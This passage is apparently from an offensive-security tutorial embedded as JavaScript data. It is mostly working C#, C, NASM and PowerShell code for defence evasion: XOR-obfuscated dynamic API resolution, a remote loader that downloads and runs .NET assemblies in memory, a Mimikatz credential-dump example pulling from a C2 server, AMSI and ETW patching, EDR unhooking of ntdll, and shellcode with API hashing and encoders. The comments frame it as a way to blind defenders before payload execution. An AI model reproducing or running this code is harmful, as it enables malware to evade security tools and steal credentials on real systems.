            throw new Exception("LoadLibrary failed");
        }
        
        // Get function address
        IntPtr pFunc = GetProcAddress(hModule, functionName);
        if (pFunc == IntPtr.Zero) {
            throw new Exception("GetProcAddress failed");
        }
        
        // Convert to delegate
        return Marshal.GetDelegateForFunctionPointer(
            pFunc, typeof(T));
    }
}

class Program {
    static void Main() {
        // Dynamically resolve OpenProcess
        var OpenProcess = (DInvoke.OpenProcessDelegate)
            DInvoke.GetAPIDelegate<DInvoke.OpenProcessDelegate>(
                "kernel32.dll", "OpenProcess");
        
        // Use like normal P/Invoke
        IntPtr hProcess = OpenProcess(
            0x1F0FFF, false, 1234);
        
        Console.WriteLine($"Handle: 0x{hProcess:X}");
        
        // Advanced: Resolve from ntdll
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtReadVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            int NumberOfBytesToRead,
            out int NumberOfBytesRead
        );
        
        var NtReadVirtualMemory = 
            (NtReadVirtualMemoryDelegate)
            DInvoke.GetAPIDelegate<NtReadVirtualMemoryDelegate>(
                "ntdll.dll", "NtReadVirtualMemory");
        
        byte[] buffer = new byte[256];
        int bytesRead;
        
        uint status = NtReadVirtualMemory(
            hProcess,
            (IntPtr)0x400000,
            buffer,
            buffer.Length,
            out bytesRead
        );
        
        Console.WriteLine($"NTSTATUS: 0x{status:X}");
    }
}

// OBFUSCATION ENHANCEMENT
// =======================

class ObfuscatedDInvoke {
    // XOR obfuscate strings
    static string Deobfuscate(byte[] data, byte key) {
        char[] result = new char[data.Length];
        for (int i = 0; i < data.Length; i++) {
            result[i] = (char)(data[i] ^ key);
        }
        return new string(result);
    }
    
    static void Main() {
        // Obfuscated "kernel32.dll"
        byte[] dllName = { 
            0x0E, 0x02, 0x11, 0x17, 0x02, 0x05, 
            0x66, 0x65, 0x23, 0x01, 0x05, 0x05 
        };
        
        // Obfuscated "OpenProcess"
        byte[] funcName = {
            0x12, 0x13, 0x02, 0x17, 0x11, 0x11,
            0x0E, 0x02, 0x12, 0x0E
        };
        
        string dll = Deobfuscate(dllName, 0x67);
        string func = Deobfuscate(funcName, 0x67);
        
        // Now resolve dynamically
        // EDR sees no suspicious strings!
    }
}`,
          language: "csharp"
        },
        {
          title: "3. In-Memory Assembly Execution",
          content: `Load and execute .NET assemblies directly from memory without touching disk. Essential for fileless attacks and post-exploitation frameworks.

TECHNIQUES:
• Assembly.Load(byte[]) - load from memory
• Reflection to invoke methods
• Can load dependencies recursively
• Execute .NET executables/DLLs

USE CASES:
• Execute C# payloads in-memory
• Load tools without dropping files
• Chain multiple .NET tools
• Post-exploitation framework`,
          code: `using System;
using System.Reflection;
using System.IO;

class InMemoryExecution {
    // Load and execute assembly from bytes
    public static object ExecuteAssembly(
        byte[] assemblyBytes,
        string className,
        string methodName,
        object[] parameters) {
        
        // Load assembly into memory
        Assembly asm = Assembly.Load(assemblyBytes);
        
        // Get type
        Type type = asm.GetType(className);
        if (type == null) {
            throw new Exception($"Type {className} not found");
        }
        
        // Get method
        MethodInfo method = type.GetMethod(methodName);
        if (method == null) {
            throw new Exception($"Method {methodName} not found");
        }
        
        // Create instance if not static
        object instance = null;
        if (!method.IsStatic) {
            instance = Activator.CreateInstance(type);
        }
        
        // Invoke method
        return method.Invoke(instance, parameters);
    }
    
    // Execute Main() of a .NET executable
    public static void ExecuteProgram(byte[] exeBytes,
                                      string[] args) {
        Assembly asm = Assembly.Load(exeBytes);
        
        // Find entry point
        MethodInfo entry = asm.EntryPoint;
        if (entry == null) {
            throw new Exception("No entry point found");
        }
        
        // Prepare parameters
        object[] parameters = new object[] { args };
        
        // Execute
        entry.Invoke(null, parameters);
    }
}

class Program {
    static void Main() {
        // Example: Load Mimikatz from memory
        byte[] mimikatzBytes = DownloadFromC2();
        
        // Execute
        InMemoryExecution.ExecuteProgram(
            mimikatzBytes,
            new string[] { "sekurlsa::logonpasswords" }
        );
    }
    
    static byte[] DownloadFromC2() {
        // Stub - download from C2 server
        return new byte[0];
    }
}

// ADVANCED: Loading dependencies
class AssemblyResolver {
    public static void SetupResolver() {
        AppDomain.CurrentDomain.AssemblyResolve += 
            ResolveAssembly;
    }
    
    static Assembly ResolveAssembly(
        object sender, ResolveEventArgs args) {
        
        // When .NET can't find assembly, we provide it
        Console.WriteLine($"Resolving: {args.Name}");
        
        // Load from embedded resource or download
        byte[] asmBytes = GetAssemblyBytes(args.Name);
        
        if (asmBytes != null) {
            return Assembly.Load(asmBytes);
        }
        
        return null;
    }
    
    static byte[] GetAssemblyBytes(string name) {
        // Stub - get from resources or C2
        return null;
    }
}

// COMPLETE EXAMPLE: Remote loader
class RemoteLoader {
    static void Main(string[] args) {
        if (args.Length < 2) {
            Console.WriteLine("Usage: loader <url> <args>");
            return;
        }
        
        // Setup dependency resolver
        AssemblyResolver.SetupResolver();
        
        // Download assembly
        using (var wc = new System.Net.WebClient()) {
            byte[] data = wc.DownloadData(args[0]);
            
            // Prepare arguments
            string[] toolArgs = new string[args.Length - 1];
            Array.Copy(args, 1, toolArgs, 0, toolArgs.Length);
            
            // Execute
            InMemoryExecution.ExecuteProgram(data, toolArgs);
        }
        
        Console.WriteLine("[+] Execution complete");
    }
}

// OPSEC CONSIDERATIONS:
// - Assembly.Load triggers ETW events
// - AMSI can scan loaded assemblies
// - Consider AMSI/ETW bypass first
// - Use obfuscation on payload
// - Encrypt during transit`,
          language: "csharp"
        }
      ]
    },
    "evasion": {
      title: "Evasion Techniques - Bypassing Defenses",
      sections: [
        {
          title: "1. AMSI Bypass - Defeating Script Scanning",
          content: `AMSI (Antimalware Scan Interface) scans scripts and in-memory content before execution. Bypassing AMSI is often the first step in post-exploitation.

HOW AMSI WORKS:
• PowerShell/C# calls amsi.dll
• Content sent to AmsiScanBuffer
• AV vendor scans buffer
• Blocks malicious content

BYPASS STRATEGIES:
• Patch AmsiScanBuffer in memory
• Force AMSI initialization failure
• Obfuscate malicious strings
• Unhook amsi.dll functions`,
          code: `using System;
using System.Runtime.InteropServices;

class AMSIBypass {
    // Method 1: Patch AmsiScanBuffer
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(
        IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    public static bool PatchAMSI() {
        try {
            // Load amsi.dll
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            if (hAmsi == IntPtr.Zero) {
                return false;
            }
            
            // Get AmsiScanBuffer address
            IntPtr pAmsiScanBuffer = GetProcAddress(
                hAmsi, "AmsiScanBuffer");
            
            if (pAmsiScanBuffer == IntPtr.Zero) {
                return false;
            }
            
            // Patch with "return 0"
            // x64: B8 57 00 07 80 C3 (mov eax, 0x80070057; ret)
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            
            // Change memory protection
            uint oldProtect;
            if (!VirtualProtect(pAmsiScanBuffer,
                (UIntPtr)patch.Length, 0x40, out oldProtect)) {
                return false;
            }
            
            // Write patch
            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
            
            // Restore protection
            VirtualProtect(pAmsiScanBuffer,
                (UIntPtr)patch.Length, oldProtect, out oldProtect);
            
            Console.WriteLine("[+] AMSI patched");
            return true;
        }
        catch (Exception ex) {
            Console.WriteLine($"[-] AMSI patch failed: {ex.Message}");
            return false;
        }
    }
    
    // Method 2: Force initialization failure
    [DllImport("amsi.dll")]
    static extern int AmsiInitialize(
        string appName, out IntPtr amsiContext);
    
    public static void ForceAMSIFailure() {
        // Trigger AMSI initialization with bad params
        // This can cause AMSI to fail open
        IntPtr ctx;
        AmsiInitialize(null, out ctx);
    }
    
    // Method 3: Context corruption
    public static bool CorruptAMSIContext() {
        try {
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            IntPtr pAmsiContext = GetProcAddress(
                hAmsi, "AmsiInitialize");
            
            // Find AMSI_RESULT enum in memory
            // Set to AMSI_RESULT_CLEAN for all scans
            
            // (Advanced implementation left as exercise)
            
            return true;
        }
        catch {
            return false;
        }
    }
}

class Program {
    static void Main() {
        // Bypass AMSI
        if (AMSIBypass.PatchAMSI()) {
            Console.WriteLine("[+] AMSI bypassed");
            
            // Now we can run suspicious code
            ExecuteMaliciousScript();
        }
    }
    
    static void ExecuteMaliciousScript() {
        // Previously blocked by AMSI
        Console.WriteLine("Executing payload...");
    }
}

// OBFUSCATION METHOD
// ==================

class ObfuscatedAMSI {
    static void Main() {
        // Obfuscate "AMSI" string
        string a = "A" + "M" + "S" + "I";
        
        // Base64 obfuscation
        string b64 = "QW1zaVNjYW5CdWZmZXI=";  // AmsiScanBuffer
        string func = System.Text.Encoding.UTF8.GetString(
            Convert.FromBase64String(b64));
        
        // Now patch using obfuscated strings
    }
}

// POWERSHELL AMSI BYPASS
// ======================
/*
# Classic one-liner (often signature-detected now)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
    GetField('amsiInitFailed','NonPublic,Static').
    SetValue($null,$true)

# More advanced (memory patch)
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {
    if ($e.Name -like "*Context") {
        $f=$e
    }
};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
*/`,
          language: "csharp"
        },
        {
          title: "2. ETW Patching - Blind the Defenders",
          content: `ETW (Event Tracing for Windows) provides telemetry to EDR. Patching ETW prevents your actions from being logged.

ETW EVENTS THAT EXPOSE YOU:
• PowerShell script blocks
• .NET assembly loads
• Process creation
• Thread creation
• Image loads

PATCHING TECHNIQUE:
• Find EtwEventWrite in ntdll.dll
• Patch with "ret" instruction (0xC3)
• All ETW logging fails silently`,
          code: `using System;
using System.Runtime.InteropServices;

class ETWBypass {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(
        IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    public static bool PatchETW() {
        try {
            // Get ntdll.dll
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] Failed to get ntdll");
                return false;
            }
            
            // Get EtwEventWrite address
            IntPtr pEtwEventWrite = GetProcAddress(
                hNtdll, "EtwEventWrite");
            
            if (pEtwEventWrite == IntPtr.Zero) {
                Console.WriteLine("[-] EtwEventWrite not found");
                return false;
            }
            
            Console.WriteLine($"[*] EtwEventWrite at 0x{pEtwEventWrite:X}");
            
            // Patch bytes (x64)
            // 33 C0  xor eax, eax  (return 0)
            // C3     ret
            byte[] patch = { 0x33, 0xC0, 0xC3 };
            
            // Or simpler: just ret (may cause issues)
            // byte[] patch = { 0xC3 };
            
            // Change protection to RWX
            uint oldProtect;
            if (!VirtualProtect(pEtwEventWrite,
                (UIntPtr)patch.Length, 0x40, out oldProtect)) {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }
            
            // Apply patch
            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
            
            // Restore original protection
            VirtualProtect(pEtwEventWrite,
                (UIntPtr)patch.Length, oldProtect, out oldProtect);
            
            Console.WriteLine("[+] ETW patched successfully");
            return true;
        }
        catch (Exception ex) {
            Console.WriteLine($"[-] ETW patch failed: {ex.Message}");
            return false;
        }
    }
    
    // Alternative: Patch EtwEventWriteFull
    public static bool PatchETWFull() {
        try {
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            IntPtr pEtw = GetProcAddress(hNtdll, "EtwEventWriteFull");
            
            if (pEtw == IntPtr.Zero) {
                return false;
            }
            
            byte[] patch = { 0x33, 0xC0, 0xC3 };
            uint oldProtect;
            
            VirtualProtect(pEtw, (UIntPtr)3, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, pEtw, 3);
            VirtualProtect(pEtw, (UIntPtr)3, oldProtect, out oldProtect);
            
            Console.WriteLine("[+] EtwEventWriteFull patched");
            return true;
        }
        catch {
            return false;
        }
    }
}

// Combined bypass
class DefensiveEvasion {
    public static void BypassAll() {
        Console.WriteLine("[*] Bypassing defenses...");
        
        // 1. Patch AMSI
        if (AMSIBypass.PatchAMSI()) {
            Console.WriteLine("[+] AMSI bypassed");
        }
        
        // 2. Patch ETW
        if (ETWBypass.PatchETW()) {
            Console.WriteLine("[+] ETW blinded");
        }
        
        if (ETWBypass.PatchETWFull()) {
            Console.WriteLine("[+] ETW Full blinded");
        }
        
        Console.WriteLine("[+] All defenses bypassed");
        Console.WriteLine("[*] Ready for payload execution");
    }
}

class Program {
    static void Main() {
        DefensiveEvasion.BypassAll();
        
        // Now execute your payload with reduced visibility
        ExecutePayload();
    }
    
    static void ExecutePayload() {
        Console.WriteLine("[*] Payload executing...");
        // Your offensive operations here
    }
}

// DETECTION NOTES:
// ===============
// - Memory patching detected by some EDR
// - Suspicious VirtualProtect calls monitored
// - Consider indirect syscalls for patching
// - May need to disable PatchGuard on kernel
// - Test against specific EDR solutions`,
          language: "csharp"
        },
        {
          title: "3. API Unhooking - Removing EDR Hooks",
          content: `EDR vendors hook ntdll.dll functions to monitor behavior. Unhooking restores clean copies of these functions.

HOW EDR HOOKS WORK:
• DLL loads into your process
• Modifies start of ntdll functions
• Inserts JMP to EDR code
• EDR inspects parameters/behavior
• Allows or blocks operation

UNHOOKING TECHNIQUE:
• Read clean ntdll.dll from disk
• Parse PE to find .text section
• Copy clean .text over hooked version
• Now APIs call kernel directly`,
          code: `using System;
using System.Runtime.InteropServices;

class APIUnhooking {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateFileMappingW(
        IntPtr hFile,
        IntPtr lpAttributes,
        uint flProtect,
        uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow,
        string lpName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr MapViewOfFile(
        IntPtr hFileMappingObject,
        uint dwDesiredAccess,
        uint dwFileOffsetHigh,
        uint dwFileOffsetLow,
        UIntPtr dwNumberOfBytesToMap);
    
    [DllImport("kernel32.dll")]
    static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
    
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        // ... (abbreviated)
        public int e_lfanew;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        // ... (abbreviated)
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER {
        public ushort Magic;
        // ... (abbreviated)
        public uint SizeOfImage;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        // ... (abbreviated)
    }
    
    public static bool UnhookNtdll() {
        try {
            // 1. Get current ntdll base address
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] Failed to get ntdll");
                return false;
            }
            
            Console.WriteLine($"[*] Ntdll loaded at 0x{hNtdll:X}");
            
            // 2. Map clean ntdll from disk
            IntPtr hFile = CreateFileW(
                @"C:\\Windows\\System32\\ntdll.dll",
                0x80000000,  // GENERIC_READ
                1,           // FILE_SHARE_READ
                IntPtr.Zero,
                3,           // OPEN_EXISTING
                0,
                IntPtr.Zero);
            
            if (hFile == (IntPtr)(-1)) {
                Console.WriteLine("[-] Failed to open ntdll.dll");
                return false;
            }
            
            IntPtr hMapping = CreateFileMappingW(
                hFile, IntPtr.Zero, 2, 0, 0, null);  // PAGE_READONLY
            CloseHandle(hFile);
            
            if (hMapping == IntPtr.Zero) {
                Console.WriteLine("[-] CreateFileMapping failed");
                return false;
            }
            
            IntPtr pCleanNtdll = MapViewOfFile(
                hMapping, 4, 0, 0, UIntPtr.Zero);  // FILE_MAP_READ
            CloseHandle(hMapping);
            
            if (pCleanNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] MapViewOfFile failed");
                return false;
            }
            
            Console.WriteLine($"[*] Clean ntdll mapped at 0x{pCleanNtdll:X}");
            
            // 3. Parse PE headers (clean copy)
            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(
                pCleanNtdll);
            
            IntPtr pNtHeaders = pCleanNtdll + dosHeader.e_lfanew;
            IMAGE_NT_HEADERS ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(
                pNtHeaders);
            
            // 4. Find .text section
            IntPtr pSection = pNtHeaders + Marshal.SizeOf<IMAGE_NT_HEADERS>();
            
            for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
                IMAGE_SECTION_HEADER section = 
                    Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(
                        pSection + (i * Marshal.SizeOf<IMAGE_SECTION_HEADER>()));
                
                string sectionName = System.Text.Encoding.ASCII.GetString(
                    section.Name).TrimEnd('\\0');
                
                if (sectionName == ".text") {
                    Console.WriteLine($"[*] Found .text section");
                    Console.WriteLine($"    VA: 0x{section.VirtualAddress:X}");
                    Console.WriteLine($"    Size: 0x{section.VirtualSize:X}");
                    
                    // 5. Unhook: copy clean .text
                    IntPtr pHookedText = hNtdll + (int)section.VirtualAddress;
                    IntPtr pCleanText = pCleanNtdll + (int)section.VirtualAddress;
                    
                    // Change protection
                    uint oldProtect;
                    if (!VirtualProtect(pHookedText,
                        (UIntPtr)section.VirtualSize, 0x40, out oldProtect)) {
                        Console.WriteLine("[-] VirtualProtect failed");
                        UnmapViewOfFile(pCleanNtdll);
                        return false;
                    }
                    
                    // Copy clean bytes
                    byte[] cleanBytes = new byte[section.VirtualSize];
                    Marshal.Copy(pCleanText, cleanBytes, 0, (int)section.VirtualSize);
                    Marshal.Copy(cleanBytes, 0, pHookedText, (int)section.VirtualSize);
                    
                    // Restore protection
                    VirtualProtect(pHookedText,
                        (UIntPtr)section.VirtualSize, oldProtect, out oldProtect);
                    
                    Console.WriteLine("[+] Ntdll.dll unhooked!");
                    break;
                }
            }
            
            // Cleanup
            UnmapViewOfFile(pCleanNtdll);
            
            return true;
        }
        catch (Exception ex) {
            Console.WriteLine($"[-] Unhooking failed: {ex.Message}");
            return false;
        }
    }
}

class Program {
    static void Main() {
        Console.WriteLine("[*] Starting API unhooking...");
        
        if (APIUnhooking.UnhookNtdll()) {
            Console.WriteLine("[+] Ready for stealthy operations");
            // Now your syscalls bypass EDR hooks
        }
    }
}`,
          language: "csharp"
        }
      ]
    },
    "shellcode": {
      title: "Shellcode Development - Position Independent Code",
      sections: [
        {
          title: "1. x64 Assembly Fundamentals",
          content: `Shellcode is machine code that executes without dependencies. Understanding x64 assembly is essential for writing position-independent, compact payloads.

X64 CALLING CONVENTION (Windows):
• RCX - First argument
• RDX - Second argument
• R8  - Third argument
• R9  - Fourth argument
• Stack - Additional arguments
• RAX - Return value

PRESERVED REGISTERS:
• RBX, RBP, RDI, RSI, R12-R15 must be saved
• All others can be modified

SHELLCODE REQUIREMENTS:
• No absolute addresses (position independent)
• No static strings (use stack or RIP-relative)
• Resolve APIs dynamically
• Handle own imports`,
          code: `; Basic x64 shellcode structure (NASM syntax)
BITS 64

; Entry point
start:
    ; 1. Save registers (optional for shellcode)
    push rbx
    push rsi
    push rdi
    
    ; 2. Get PEB (Process Environment Block)
    ; fs:[0x30] = PEB on x64 Windows
    mov rax, [gs:0x60]        ; PEB pointer
    
    ; 3. Get kernel32.dll base from PEB
    mov rax, [rax + 0x18]     ; PEB->Ldr
    mov rsi, [rax + 0x20]     ; InMemoryOrderModuleList
    lodsq                      ; First entry (ntdll.dll)
    xchg rsi, rax
    lodsq                      ; Second entry (kernel32.dll)
    mov rbx, [rax + 0x20]     ; DllBase (kernel32)
    
    ; 4. Parse PE headers to find exports
    mov r8d, [rbx + 0x3C]     ; e_lfanew (PE header offset)
    lea r9, [rbx + r8]        ; NT headers
    mov r8d, [r9 + 0x88]      ; Export directory RVA
    lea r9, [rbx + r8]        ; Export directory
    
    ; 5. Find function by hash
    ; (See GetProcAddress implementation)
    
    ; 6. Call WinAPI functions
    ; LoadLibraryA, GetProcAddress, etc.
    
    ; 7. Execute payload
    call execute_payload
    
    ; 8. Cleanup and exit
    pop rdi
    pop rsi
    pop rbx
    ret

execute_payload:
    ; Your payload code here
    ; E.g., spawn cmd.exe, reverse shell, etc.
    ret

; ============================================
; FUNCTION: Find API by hash
; ============================================
; Input: RCX = DLL base, EDX = hash
; Output: RAX = function address

find_function:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    
    mov rdi, rcx              ; DLL base
    mov r8d, [rdi + 0x3C]     ; e_lfanew
    lea r9, [rdi + r8]        ; NT headers
    mov r8d, [r9 + 0x88]      ; Export RVA
    lea r9, [rdi + r8]        ; Export directory
    
    mov ecx, [r9 + 0x18]      ; NumberOfNames
    mov r10d, [r9 + 0x20]     ; AddressOfNames RVA
    lea r10, [rdi + r10]      ; Names array
    
.loop:
    dec ecx
    mov esi, [r10 + rcx*4]    ; Name RVA
    lea rsi, [rdi + rsi]      ; Name string
    
    ; Hash the name
    xor rax, rax
    xor rbx, rbx
    
.hash_loop:
    lodsb                     ; Load byte
    test al, al               ; Check null terminator
    jz .hash_done
    ror rbx, 13               ; ROR13 hash
    add rbx, rax
    jmp .hash_loop
    
.hash_done:
    cmp ebx, edx              ; Compare with target hash
    jne .loop
    
    ; Found! Get function address
    mov r11d, [r9 + 0x24]     ; AddressOfNameOrdinals
    lea r11, [rdi + r11]
    movzx ecx, word [r11 + rcx*2]  ; Ordinal
    
    mov r11d, [r9 + 0x1C]     ; AddressOfFunctions
    lea r11, [rdi + r11]
    mov eax, [r11 + rcx*4]    ; Function RVA
    lea rax, [rdi + rax]      ; Function address
    
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================
; COMPLETE EXAMPLE: MessageBox shellcode
; ============================================

bits 64

start:
    ; Get kernel32 base
    xor rcx, rcx
    mov rax, [gs:rcx + 0x60]  ; PEB
    mov rax, [rax + 0x18]     ; Ldr
    mov rax, [rax + 0x20]     ; InMemoryOrderModuleList
    mov rax, [rax]            ; Second entry
    mov rax, [rax]            ; Third entry (kernel32)
    mov rbx, [rax + 0x20]     ; DllBase
    
    ; Get LoadLibraryA
    mov rcx, rbx
    mov edx, 0xec0e4e8e       ; Hash("LoadLibraryA")
    call find_function
    mov r15, rax              ; Save LoadLibraryA
    
    ; Load user32.dll
    lea rcx, [rel user32_dll]
    call r15                  ; LoadLibraryA("user32.dll")
    mov rbx, rax              ; user32 base
    
    ; Get MessageBoxA
    mov rcx, rbx
    mov edx, 0x384f8e8d       ; Hash("MessageBoxA")
    call find_function
    mov r14, rax              ; Save MessageBoxA
    
    ; Call MessageBoxA
    xor rcx, rcx              ; hWnd = NULL
    lea rdx, [rel msg_text]   ; lpText
    lea r8, [rel msg_title]   ; lpCaption
    xor r9, r9                ; uType = MB_OK
    call r14
    
    ret

user32_dll: db "user32.dll", 0
msg_text:   db "Shellcode!", 0
msg_title:  db "POC", 0

; Compile: nasm -f win64 shellcode.asm -o shellcode.obj
; Link: ld -m i386pep shellcode.obj -o shellcode.exe
; Extract: objcopy -O binary --only-section=.text shellcode.exe shellcode.bin`,
          language: "nasm"
        },
        {
          title: "2. API Hashing - Hiding Function Names",
          content: `API hashing dynamically resolves functions without storing their names. This avoids signature detection and makes reverse engineering harder.

WHY API HASHING:
• No function name strings in shellcode
• Smaller payload size
• Defeats string-based detection
• Standard technique in exploits

COMMON HASH ALGORITHMS:
• ROR13 - Most common, fast
• CRC32 - Good distribution
• FNV1a - Fast, simple
• Custom algorithms`,
          code: `// C implementation of ROR13 hash
#include <windows.h>
#include <stdio.h>

// ROR13 hash algorithm
DWORD HashString(const char* str) {
    DWORD hash = 0;
    
    while (*str) {
        hash = _rotr(hash, 13);  // Rotate right 13 bits
        hash += *str;
        str++;
    }
    
    return hash;
}

// Generate hash table
void GenerateHashes() {
    const char* functions[] = {
        "LoadLibraryA",
        "GetProcAddress",
        "VirtualAlloc",
        "CreateThread",
        "WaitForSingleObject",
        "ExitProcess",
        "MessageBoxA",
        "CreateProcessA"
    };
    
    printf("// API Hash Table\\n");
    printf("#define HASH_%-20s 0x%08X\\n\\n", 
           "LoadLibraryA", HashString("LoadLibraryA"));
    
    for (int i = 0; i < sizeof(functions)/sizeof(char*); i++) {
        printf("#define HASH_%-20s 0x%08X\\n",
               functions[i], HashString(functions[i]));
    }
}

// Find function by hash in export table
PVOID GetFunctionByHash(HMODULE hModule, DWORD dwHash) {
    BYTE* pBase = (BYTE*)hModule;
    
    // Parse PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    
    // Get export directory
    IMAGE_DATA_DIRECTORY exportDir = 
        pNt->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    PIMAGE_EXPORT_DIRECTORY pExport = 
        (PIMAGE_EXPORT_DIRECTORY)(pBase + 
                                  exportDir.VirtualAddress);
    
    // Get arrays
    DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
    WORD* pOrdinals = (WORD*)(pBase + 
                              pExport->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)(pBase + 
                                  pExport->AddressOfFunctions);
    
    // Search for hash
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)(pBase + pNames[i]);
        
        if (HashString(szName) == dwHash) {
            WORD ordinal = pOrdinals[i];
            PVOID pFunc = pBase + pFunctions[ordinal];
            return pFunc;
        }
    }
    
    return NULL;
}

// Example usage
#define HASH_LoadLibraryA      0xec0e4e8e
#define HASH_GetProcAddress    0x7c0dfcaa
#define HASH_VirtualAlloc      0x91afca54
#define HASH_CreateThread      0x799aacc6

typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

int main() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    
    // Resolve by hash
    fnLoadLibraryA pLoadLib = (fnLoadLibraryA)
        GetFunctionByHash(hKernel32, HASH_LoadLibraryA);
    
    fnGetProcAddress pGetProc = (fnGetProcAddress)
        GetFunctionByHash(hKernel32, HASH_GetProcAddress);
    
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)
        GetFunctionByHash(hKernel32, HASH_VirtualAlloc);
    
    if (pLoadLib && pGetProc && pVirtualAlloc) {
        printf("[+] Functions resolved by hash\\n");
        
        // Use them normally
        HMODULE hUser32 = pLoadLib("user32.dll");
        // ...
    }
    
    return 0;
}

// ALTERNATIVE: CRC32 hashing
DWORD CRC32Hash(const char* str) {
    DWORD crc = 0xFFFFFFFF;
    
    while (*str) {
        crc ^= *str++;
        
        for (int i = 0; i < 8; i++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    
    return ~crc;
}

// Custom hash (more obscure)
DWORD CustomHash(const char* str) {
    DWORD hash = 5381;
    
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;  // hash * 33 + c
    }
    
    return hash;
}`,
          language: "c"
        },
        {
          title: "3. Shellcode Encoders & Encryption",
          content: `Raw shellcode contains null bytes and suspicious patterns. Encoders transform shellcode into benign-looking data, with a decoder stub that reconstructs it at runtime.

COMMON ENCODERS:
• XOR - Simple, effective
• ROT-N - Caesar cipher
• Base64 - Looks like data
• Custom algorithms

ENCRYPTION:
• AES - Strong encryption
• RC4 - Lightweight stream cipher
• ChaCha20 - Modern, fast

STAGED SHELLCODE:
• Small Stage 1 downloads Stage 2
• Stage 2 is encrypted/encoded
• Evades size-based detection`,
          code: `#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

// XOR Encoder/Decoder (simplest)
void XOREncode(BYTE* data, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= key;
    }
}
